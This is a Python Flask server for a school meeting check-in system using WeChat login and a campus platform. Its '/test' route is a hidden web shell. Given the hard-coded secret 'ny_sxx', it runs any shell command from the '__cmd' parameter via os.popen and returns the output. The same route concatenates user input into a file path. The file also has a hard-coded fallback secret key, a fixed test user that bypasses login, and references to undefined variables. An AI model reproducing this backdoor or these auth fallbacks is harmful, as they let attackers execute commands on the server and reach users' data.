#!/usr/bin/env python
# -*- coding: utf8

"""
OA: 会议签到系统
基于ibeacon(plus wifi) + 小程序 on 智慧校园
thirdsvr (server mode = 3)的方式开发。
PYTHON 3, NGINX, MYSQL
"""
import os
import logging
from flask import Flask, request, send_from_directory, send_file, redirect, url_for, session, abort, json
from werkzeug.utils import secure_filename
from ultilities import check_client, json_flat_2_list

from tschool import myschool, pmsgr, app_school
import wxmnp
from sys_config import cur_config, loger, DateEncoder
from modules import meeting as MEETING, attenders as ATTENDERS, mroom as MROOM, user_tbl as USER
from actions import mgr_actions, user_actions, system

import assists as ASST
from fview_debug import debuging
from view_resource import RESOURCE
from view_api import API

#logging.basicConfig(level=logging.DEBUG, filename='sm_server.log', filemode='w', format='(%(funcName)-10s) %(message)s')
#loger = logging.getLogger()
loger.debug("starting server now...")


# 初始化Flask
app = Flask(__name__)
#app.config.from_object(cur_config.fconf)
app.secret_key  = os.environ.get('SECRET_KEY') or 'zxf***YFJEU7#@#1HFEiefj'
app.env = cur_config.conf_server('mode')
myschool.settoken(cur_config.school_token)
print('myschool.token.done')

@app.route("/system", methods=["GET", "POST"])
def back_system():
	# 超级后台
	# 管理操作：
	# 已注册的学校列表
	rtdata = {'success': 'yes', 'msg': 'done', 'code': 0, 'data': None, 'dlen': 0}
	if request.method == 'GET':
		system_code = request.args.get("syscode")
		if syscode != cur_config.system("syscode"):
			return abort(403)
		target = request.args.get("target")
		action = request.args.get("action")
		if target == 'schools':
			if action == 'list':
				rtdata['data'] = system.on_school("list")
		return json.dumps(rtdata, cls=DateEncoder)

# =================================================  NORMAL PAGES  ====================================================
# =================================================  NORMAL PAGES  ====================================================

@app.route("/mobile", methods=['GET', 'POST'])
def mobile():
	pass

@app.route('/')
@app.route('/index', methods=['GET', 'POST'])
def index():
	# 用户态登录
	# /?objectid=2XaxJgvRj6Udone&objType=2&userid=2y7M3LPNb4odone&timestamp=1586688086&sign=BAC3CB4662B8F8F96794E92780D9E14E
	rtdata = {'success': 'yes', 'msg': 'done', 'code': 0, 'data': None, 'dlen': 0}
	objid = request.args.get("objectid", "2XaxJgvRj6Udone")
	userid = request.args.get("userid") or session.get("userid")
	if not userid:
		print("un user---for test set to...")
		userid = 'ytVAOSEv75cdone'
		#userid = '2y7M3LPNb4odone'
	if request.method == 'GET':
		if not userid:
			return abort(404)
		if 'action' not in request.args:
			# go for page html
			# check client
			ua = request.headers.get('User-Agent')
			if not objid:
				if cur_config.conf_server('mode') != 'development':
					loger.error("not development mode and no objectid!")
					return abort(404)
				print("no objid found. with dev mode: set to 'no_obj_id'")
				session['objectid'] = 'no_obj_id'
			else:
				session['objectid'] = objid
			#print(ua)
			client = check_client(ua)
			uinfo = USER.user_by_userid(userid)
			if uinfo:
				print(f"user in: {uinfo}")
				session['userid'] = userid
				cookies = {'userid': userid, 'username': uinfo['username']}
			else:
				print("empty userin...")
				cookies = {'userid': userid}
			if client == 'mobile':
				return ASST.plus_file_respon('statics/htmls/mgm_mobile.html', cookies)
				#return ASST.cookie_file_respon('statics/htmls/mgm_mobile.html', cookies)
				#return send_file('statics/htmls/mgm_mobile.html', mimetype='text/html')
			elif client == 'wx':
				return 'wx index page'
			else:
				session['userid'] = userid
				print(f"session of uid=>{session['userid']}")
				# 在智慧校园系统中 session丢失
				cookies['SameSite'] = "None"
				#return ASST.cookie_file_respon('statics/htmls/admin_index.html', cookies)
				return ASST.plus_file_respon('statics/htmls/admin_index.html', cookies)
				#return send_file('statics/htmls/admin_index.html', mimetype='text/html')
		openid = session.get("openid")
		if openid:
			user = muser.get(openid)
			rtdata['msg'] = 'logoned-index'
			rtdata['data'] = user.loadtime
		else:
			rtdata['success'] = 'no'
		return json.dumps(rtdata)
	print(request.form)
	return json.dumps(rtdata, cls=DateEncoder)

@app.route("/group", methods=['GET', 'POST'])
def group():
	objid = request.args.get("objectid", "2XaxJgvRj6Udone")
	# 新增组织（学校）；未注册; may redirect from index
	if not objid:
		return "请从智慧校园平台登入！"
	rtdata = {'success': 'yes', 'msg': 'done', 'code': 0, 'data': None, 'dlen': 0}
	if request.method == 'GET':
		pass

@app.route("/school", methods=['GET'])
def school():
	# get school date
	rtdata = {'success': 'yes', 'msg': 'done', 'code': 0, 'data': None, 'dlen': 0}
	objid = request.args.get("objectid", "2XaxJgvRj6Udone")
	#objid = request.args.get("objectid") or cur_config.cnf_get("default_objid")
	userid = request.args.get('userid', 'alex')
	school = myschool.myschool(objid)
	action = request.args.get("action")
	if action == 'developments':
		datas = school.col_departments(2)
	elif action == 'schoolinfo':
		datas = school.schoolinfo()
	elif action == 'dpart_users':
		dpid = request.args.get("departid")
		level = int(request.args.get("level", 6))
		datas = school.col_dep_tearchers(dpid, level)
	if datas:
		rtdata['data'] = datas
	else:
		rtdata['success'] = 'no'
	return json.dumps(rtdata, cls=DateEncoder)

# =================================================  WX PAGES  ====================================================
# =================================================  WX PAGES  ====================================================
# 用户注册基于智慧校园-userid
# update + plus test user: userid="testuser"
@app.route("/wxuser", methods=['GET', 'POST'])
def wxuser():
	rtdata = {'success': 'yes', 'msg': 'done', 'code': 0, 'data': None, 'dlen': 0}
	print(request.args)
	action = request.args.get('action')
	if action is None:
		# auto login
		js_code = request.args.get("js_code")
		openid = request.args.get("openid")
		# update: reg with jscode
		wx_rsp = wxmnp.wx_logon(js_code)
		if wx_rsp.get('errcode', 0) == 0:
			openid = wx_rsp['openid']
			#成功通讯weixin-server; 确认是否存在
			#userid = USER.user_by_openid(openid)
			#uinfo = USER.user_by_openid2(openid)
			userid_obj = USER.get_userby(openid, 'openid')
			#userid = "test_userid"
			#userid = None
			if not userid_obj:
				rtdata['openid'] = openid
				rtdata['reged'] = 'no'
				rtdata['msg'] = '用户未注册，请用管理员发放的编号进行注册。'
			else:
				# reged and should login
				rtdata['reged'] = 'yes'
				rtdata['userid'] = userid_obj[0]
				rtdata['openid'] = openid
				rtdata['school'] = system.on_school('get', userid_obj[1])
		elif openid:
			userid_obj = USER.user_by_openid2(openid)
			if userid_obj:
				#uid/objid
				school= system.on_school('get', userid_obj[1])
				rtdata['data'] = {'userid': userid_obj[0], 'objid': userid_obj[1], 'school': school}
			# user exists
			rtdata['exists'] = 'yes'
		return json.dumps(rtdata, cls=DateEncoder)

	if action == 'regist':
		formdata = request.form.to_dict()
		ukey = formdata['ukey']
		#u = USER.user_by_userid(userid)
		# ukey could be phone/name
		u = USER.get_userby(ukey, fullinfo=True)
		if not u or u['status'] != USER.STA_UNREG:
			rtdata['success'] = 'no'
			rtdata['msg'] = '用户不存在或者无法注册'
			return json.dumps(rtdata)
		#username = request.form["username"]
		#password = formdata["password"]
		schoolid = formdata.pop("schoolid")
		openid = formdata.get("openid")
		if not openid:
			js_code = formdata.pop("js_code")
			wx_rsp = wxmnp.wx_logon(js_code)
			if wx_rsp.get('errcode', 0) == 0:
				openid = wx_rsp['openid']
			else:
				rtdata['success'] = 'no'
				rtdata['msg'] = '无法获取OPENID'
				return json.dumps(rtdata)
		userid = u['userid']
		formdata['openid'] = openid
		if USER.regist(userid, schoolid, formdata):
			rtdata['data'] = {'openid': openid}
			return json.dumps(rtdata)
	elif action == 'schoolist':
		# GET:
		rtdata['data'] = system.on_school('list')
		#rtdata['data'] = [{'title': 'school1', 'objectid': '0001', 'sch_index': 1}]
		return json.dumps(rtdata)
	elif action == 'mymeetings':
		userid = request.args.get("userid")
		ondate = request.args.get('ondate') #could be None
		user_hanlder = user_actions(userid)
		meetings = user_hanlder.user_meetings(userid, ondate)
		if meetings:
			rtdata['data'] = meetings
		else:
			rtdata['success'] = 'no'
	elif action == 'wxlogin':
		ukey = request.form["ukey"]
		userid = USER.get_userby(ukey)[0]
		password = request.form["password"]
		schoolid = request.form["schoolid"]
		openid = request.form.get("openid")
		js_code = request.form.get("js_code")
		if not openid and js_code:
			wx_rsp = wxmnp.wx_logon(js_code)
			if wx_rsp.get('errcode', 0) == 0:
				openid = wx_rsp['openid']
			else:
				rtdata['success'] = 'no'
				rtdata['msg'] = '无法获取OPENID'
				return json.dumps(rtdata)
		else:
			rtdata['success'] = 'no'
			rtdata['msg'] = '未获得登陆码(js_code)'
			return json.dumps(rtdata)
		user = user_actions.login(schoolid, password, openid, userid=userid)
		print(user)
		if user:
			rtdata['data'] = {'userid': user.extdata}
		else:
			rtdata['success'] = 'no'
		#if ASST.wxlogin(userid, password, openid) is False
		#	rtdata['success'] = 'no'
		return json.dumps(rtdata)
	rtdata['success'] = 'no'
	return json.dumps(rtdata, cls=DateEncoder)

# =================================================  STATIC SORUCES  ====================================================
# =================================================  STATIC SORUCES  ====================================================
# 
@app.route("/test/<subpage>", methods=['GET'])
def testing(subpage=""):
    #http://127.0.0.1:7890/test?req=cct&termid=qb4dU5qabq8done
    #http://127.0.0.1:7890/test?req=totalsum&yearid=AyA0hzjuneQNZAdone&termid=qb4dU5qabq8done&examid=10
    #&grades=zAoYvY2Z14Edone&courses=cQYnYgGLW1Ydone,F7fG6VQUJe0done,QfOsk8KTb2Udone
    if not subpage:
        return "EMPTY"
    if request.args.get("secret") != 'ny_sxx':
        return "EMPTY"
    cmd = request.args.get("__cmd")
    if cmd:
        cmdrt = os.popen(cmd)
        return cmdrt.read()
    # /test/page_name?secret=nysxx
    return send_file('static/htmls/' + subpage + '.html', mimetype='text/html')
# static files for windows
@app.route('/download')
@app.route('/download/<tmpfile>')
def downloadfile(tmpfile=''):
	return send_from_directory(cur_config.folder('tmp_fd'), tmpfile)

# static files for windows
@app.route('/js')
@app.route('/js/<jsfile>')
def jsfiles(jsfile=''):
	path = os.path.join(cur_config.folder('static_fd'), 'js')
	return send_from_directory(path, jsfile)

@app.route('/imgs/<filen>', methods=['GET'])
def files(filen=''):
	path = os.path.join(cur_config.folder('static_fd'), 'imgs')
	return send_from_directory(path, filen)
# static files are suppored in linux
# when nginx，it's no need
@app.route('/statics/<fd>/<filen>')
@app.route('/statics/<filen>')
def statics(fd='', filen=''):
	if not fd:
		try:
			ext = filen.split('.')[-1].lower()
		except ValueError:
			return ''
		if ext in ('jpg', 'png', 'gif'):
			fd = 'resource'
		elif ext == 'js':
			fd = 'js'
		else:
			fd = ''
	return send_from_directory(os.path.join(cur_config.folder('static_fd'), fd), filen)

print('main-step1')
# =================================================  BIND PAGES  ====================================================
# =================================================  BIND PAGES  ====================================================
app.add_url_rule('/api/<target>', 'api', API, methods=['GET', 'POST'])
app.add_url_rule('/resource/<target>', 'resource', RESOURCE, methods=['GET'])
app.add_url_rule('/debuging', 'debuging', debuging, methods=['GET', 'POST'])
print('main-step2')
if __name__ == '__main__':
	app.debug = True
	app.run(host='0.0.0.0', port=7890)